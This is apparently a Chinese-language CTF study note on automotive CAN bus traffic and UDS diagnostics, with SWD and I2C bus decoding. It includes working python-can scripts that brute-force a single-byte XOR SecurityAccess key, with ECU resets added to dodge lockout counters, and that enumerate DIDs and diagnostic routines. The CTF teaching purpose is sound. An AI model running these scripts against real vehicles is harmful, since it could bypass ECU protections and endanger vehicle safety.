---

title: 车联网 CAN 总线与 UDS 诊断
phase: misc
vuln_class: [misc, automotive, can, uds, iso14229, obd, swd, i2c]
summary: 车载题的判据是「这帧在总线上干什么」——ID 决定谁在说话，UDS 首字节决定是请求还是响应，服务号决定能读什么。仲裁 ID 配错、服务号猜错，后面所有爆破都是白跑。
---

# 车联网 CAN 总线与 UDS 诊断

车载题的共同结构：给你一段总线流量或一个仿真终端，flag 藏在某个「合法诊断请求才能读到的位置」。所以先分清三层——**物理/链路层（CAN 帧怎么发）、诊断层（UDS 服务怎么用）、调试层（SWD/I2C 这类板级总线）**。三层混着猜是最常见的浪费。

## 0. 判据速查

| 观察到的现象 | 结论 | 去哪节 |
|---|---|---|
| 流量里只有 `arbitration_id` + 8 字节 data | 纯 CAN 层，先统计 ID 分布 | §1 |
| 数据段首字节是 `0x0N`（N=载荷长度） | ISO-TP 单帧，第 2 字节是服务号 | §2 |
| 首字节 `0x1X` / `0x2X` / `0x3X` | 多帧：首帧 / 连续帧 / 流控帧 | §2.2 |
| 请求 ID `0x7E0`、响应 ID `0x7E8` | 标准诊断通信对，按 8 偏移 | §2.1 |
| 响应以 `0x7F <服务号> <NRC>` 开头 | 否定响应，NRC 就是失败原因 | §2.3 |
| 题目提示「单字节 XOR 是很好的安全措施」 | SecurityAccess 种子-密钥用单字节密钥，可全量爆破 | §3.1 |
| 需要读一块内存地址 | `0x23` ReadMemoryByAddress，需先过 `0x27` | §3.3 |
| 抓包里是 SWCLK/SWDIO 两通道数字波形 | ARM SWD 调试协议，不是 CAN | §4.1 |
| 抓包里是 SCL/SDA 两通道 | I²C，先认地址和命令字节 | §4.2 |
| 只有 CAN 帧但 ID 是 778 / 0x30A 这类非诊断 ID | 车辆功能帧，flag 可能直接在 payload 里 | §1.3 |

## 1. CAN 层：先看清谁在说话

### 1.1 帧结构与配置

11 位标准帧 ID（0x000–0x7FF）用于车身与诊断；29 位扩展帧用于 J1939 等商用车协议。DLC 最多 8 字节（CAN FD 可到 64，但 CTF 里少见）。

```bash
sudo ip link set can0 type can bitrate 500000   # 波特率必须与目标一致，错了全是错误帧
sudo ip link set up can0

candump can0                    # 实时
candump -l can0                 # 落盘（candump-<ts>.log）
cansniffer can0                 # 只高亮变化的字节，找周期帧最快
canplayer -I logfile.log can0   # 重放
cansend can0 7E0#03220008       # 手动发一帧（ID#HEXDATA）
```

`cansniffer` 比 `candump` 好用得多：周期帧的固定字节被压掉，只剩真正变化的位，一眼能看出哪个 ID 在传状态。

### 1.2 用 python-can 批量收发

爆破类题目一律走 `python-can`，`cansend` 只适合手发单帧。

```python
import can, binascii

bus = can.Bus(interface='socketcan', channel='vcan0')
bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])  # 只听响应

msg = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                  data=[0x03, 0x22, 0xF1, 0x90, 0, 0, 0, 0])
bus.send(msg, timeout=0.2)
resp = bus.recv(timeout=0.5)
print(binascii.hexlify(resp.data).decode() if resp else "no reply")
```

**必须设 filter**。不设的话 `bus.recv()` 会收到总线上所有帧（包括你自己发的请求），拿到的第一条未必是响应，后续解析全部错位。

### 1.3 非诊断 ID 里直接藏数据

车辆功能帧（灯光、门锁、车速）的 payload 常常就是明文或简单编码的字符串。判据：**payload 里有可打印 ASCII 连续段**，直接 hex 转字符看，不用管协议语义。

```python
bytes.fromhex("62687b494e46414d4f55535f52454d414b457d")   # → bh{INFAMOUS_REMAKE}
```

端序陷阱：多字节数值字段在车载域里**大小端都有**（OMRON、部分日系 ECU 用小端）。整段数据读出来是乱码时，先按 2 字节交换再试：

```python
def swap2(h):
    return ''.join(h[i+2:i+4] + h[i:i+2] for i in range(0, len(h), 4))
```

## 2. UDS（ISO 14229）：诊断层

### 2.1 通信对与寻址

标准诊断：请求 `0x7E0`，响应 `0x7E8`（偏移 8，功能寻址 `0x7DF` 广播）。扩展寻址时首字节是目标地址，服务号后移一位——**先确认寻址模式，再看服务号在第几字节**。

### 2.2 ISO-TP 分帧

UDS 载荷超过 7 字节就要分帧，首字节是 PCI：

| PCI 高 4 位 | 类型 | 含义 |
|---|---|---|
| `0x0` | 单帧 SF | 低 4 位 = 载荷长度 |
| `0x1` | 首帧 FF | 低 4 位 + 第 2 字节 = 总长度，后 6 字节是数据 |
| `0x2` | 连续帧 CF | 低 4 位是序号（从 1 递增，回绕到 0） |
| `0x3` | 流控帧 FC | 接收方回给发送方，告诉它继续发 |

读大块内存时，收到首帧后**必须回一个流控帧**（`0x30 0x00 0x00 ...`）才会继续收到连续帧，否则只能拿到第一段。这是「读内存只读到前 6 字节」的唯一原因。

### 2.3 否定响应：NRC 就是失败原因

`0x7F <服务号> <NRC>`。常用 NRC：

| NRC | 含义 | 处理 |
|---|---|---|
| `0x11` | 服务不支持 | 换服务号 |
| `0x12` / `0x13` | 长度/格式不对 | 改 PCI 或 DLC |
| `0x22` | 条件不满足 | 先发 `0x10` 会话切换或 `0x27` 解锁 |
| `0x31` | 请求超出范围 | 参数越界，缩小枚举区间 |
| `0x33` | 安全访问被拒 | 没过 `0x27` |
| `0x35` | 密钥无效 | 密钥算错，重来 seed |

爆破时把 NRC 当**过滤器**用：固定 NRC 说明这一路走不通，变化的那个才是命中。

## 3. 服务层打法

### 3.1 `0x27` SecurityAccess：种子-密钥

流程固定两步：先请求 seed（子功能奇数，如 `0x01`），再用 seed 算出 key 发回（子功能偶数，如 `0x02`）。

```python
# 单字节 XOR 密钥的全量爆破（子功能 0x01 拿 seed → 0x02 送 key）
for k in range(0x100):
    bus.send(can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                         data=[0x02, 0x11, 0x01, 0, 0, 0, 0, 0]))   # 0x11 ECUReset 清状态
    bus.recv()
    bus.send(can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                         data=[0x02, 0x27, 0x01, 0, 0, 0, 0, 0]))   # 请求 seed
    seed = binascii.hexlify(bus.recv().data).decode()[6:14]          # 4 字节 seed
    key = [int(seed[i:i+2], 16) ^ k for i in (0, 2, 4, 6)]
    bus.send(can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                         data=[0x06, 0x27, 0x02, *key, 0]))
    if binascii.hexlify(bus.recv().data).decode() != "037f2735":     # 不是 NRC 0x35 = 成功
        print("key =", hex(k)); break
```

**每次尝试前必须发 `0x11 0x01`（ECUReset）**。ECU 有失败计数，连续错几次会锁死（NRC `0x36` 超出尝试次数），锁了就得等延时或重启——爆破循环里漏掉 reset 是「跑到一半全变 0x36」的原因。

密钥算法通常在 ECU 固件里，反推时的判据：seed 长度、是否有移位/查表、是否用常量异或。单字节 XOR、`seed ^ 常量`、字节序反转这三类占绝大多数。

### 3.2 `0x22` ReadDataByIdentifier：按 DID 遍历

DID 是 2 字节，全空间 65536 个。爆破时**不要跑全量**，先按标准 DID 段试（`0xF1xx` 是车辆信息、`0xF18x` 是零件号），再扩到 0x0000–0xFFFF。

```python
for hi in range(0x100):
    for lo in range(0x100):
        bus.send(can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8,
                             data=[0x03, 0x22, hi, lo, 0, 0, 0, 0]))
        r = bus.recv(timeout=0.1)
        if r and not r.data.startswith(b'\x03\x7f'):
            print(hex(hi), hex(lo), binascii.hexlify(r.data).decode())
```

判据：**响应的 PCI 是 `0x0N` 且第 2 字节是 `0x62`**（服务号 + 0x40）才是有数据；`0x7F` 开头是拒绝。带 `time.sleep(0.01)` 控制速率，仿真器常常扛不住满速。

### 3.3 `0x23` ReadMemoryByAddress 与 `0x31` RoutineControl

`0x23` 按地址读内存，格式 `0x23 <地址长度格式> <地址> <长度>`，需要先过 `0x27`。地址常在题目提示里直接给（`0xc0ffe000` 这类「coffee」占位是典型蜜罐/测试地址，说明题目就让你读这儿）。

`0x31` RoutineControl 是「让 ECU 执行某个例程」，格式 `0x31 <子功能 01=start/02=stop/03=results> <routine_id 2字节>`。爆破 `(routine_id, sub_func)` 组合时，过滤掉固定 NRC（如 `037f3131` = 服务 0x31 不支持），剩下的就是有效例程。

### 3.4 会话与保活

有些服务只在扩展会话下可用：先 `0x10 0x03`（扩展诊断会话），再发目标服务。长时间爆破时 ECU 会因无通信超时退回默认会话，需要周期发 `0x3E 0x00`（TesterPresent）保活。

## 4. 板级调试总线：SWD 与 I²C

车载题有时不给 CAN 流量，而给逻辑分析仪抓的板级波形。这时问题从「协议语义」变成「位流恢复」。

### 4.1 SWD（ARM 调试口）

三线：`SWDIO`（双向数据）、`SWCLK`（时钟）、`SWO`（可选跟踪）。抓包只给 `SWCLK`/`SWDIO` 两列时间戳采样时，按 CLK 上升沿采 `SWDIO` 还原位流，再按 SWD 事务结构切分：

- 请求阶段 8 bit：`Start(1) APnDP RnW A[2:3] Parity Stop Park`
- 之后是 `Trn`（ turnaround）位，方向切换
- ACK 3 bit：`OK` / `WAIT` / `FAULT`
- 数据阶段 33 bit（32 数据 + 1 奇偶）

判据：**看到 `0xe000ed00` 就是 DEMCR**（调试异常与监控控制寄存器），**看到 `0x410fd212` 这类值就是 CPUID**（Cortex-M3）。这两个地址是「SWD 抓包解析对了」的铁证。DP 寄存器里 `0x0`=DPIDR、`0x4`=CTRL/STAT、`0xC`=RDBUFF；AP 侧 `0x0`=CSW、`0x4`=TAR、`0xC`=DRW。

读内存的完整流程：写 TAR（目标地址）→ 读 DRW → 读 RDBUFF 拿结果（**RDBUFF 那一步不能省**，DRW 返回的是上一次的流水线值）。

### 4.2 I²C

`SCL`/`SDA` 两通道。起始条件 = SCL 高时 SDA 下降沿；地址 7 bit + 读写位；每字节后跟 ACK。判据：**首字节的高 7 位就是设备地址**（如 `0x63` 是常见 OLED/传感器地址段），第 2 字节常是寄存器/命令。

数据端序同样可能反：`0x63 0x00 0x00 0x01` 这种「地址 + 命令 + 参数」结构里，多字节参数按小端拼。

## 5. 纪律

- **先定层，再定打法**。分不清是 CAN 语义题还是板级位流题，就会拿 `candump` 去解 SWD 波形。
- **仲裁 ID 和波特率是前提**。错一个，后面所有帧都是噪声。
- **NRC 当过滤器**，不要当错误日志忽略。它直接告诉你下一步该补哪个前置服务。
- **爆破必须带状态重置**（`0x11` 或 `0x3E` 保活），否则跑到一半被锁，结论全错。
- 只把「现象 → 判据 → 服务/命令」写进来；具体某题的第几步不写。

## 6. 交叉引用

- 固件提取、固件解包、RTOS 逆向 → [[binary/逆向工程/平台专项逆向.md|平台与架构]]
- 逻辑分析仪抓包、UART/I²C/SPI 波形恢复 → [[forensics/隐写与信号/硬件信号与物理介质取证.md|硬件信号与物理介质取证]]
- USB / 蓝牙外设流量 → [[forensics/隐写与信号/全方向 HID、蓝牙外设流量分析.md|外设抓包]]
